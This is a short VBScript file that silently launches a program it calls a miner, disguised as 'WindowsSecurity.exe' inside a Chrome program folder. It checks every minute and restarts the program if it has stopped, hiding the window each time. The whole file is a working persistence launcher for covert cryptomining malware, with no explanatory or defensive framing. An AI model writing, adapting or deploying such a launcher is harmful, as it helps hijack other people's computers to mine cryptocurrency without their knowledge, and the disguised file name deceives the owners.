Set objShell = CreateObject("WScript.Shell")

' Path to WindowsSecurity.exe
minerPath = "C:\Program Files\Chrome\WindowsSecurity.exe"

' Run immediately when pasted
RunMiner

' Start the loop to check every 1 minute
Do
    WScript.Sleep 60000 ' Wait 1 minute
    RunMiner
Loop

' Function to check and run miner
Sub RunMiner()
    If Not ProcessExists("WindowsSecurity.exe") Then
        objShell.Run """" & minerPath & """", 0, False ' Run silently
    End If
End Sub

' Function to check if a process is running
Function ProcessExists(procName)
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMI.ExecQuery("Select * from Win32_Process Where Name='" & procName & "'")
    ProcessExists = (colProcesses.Count > 0)
End Function
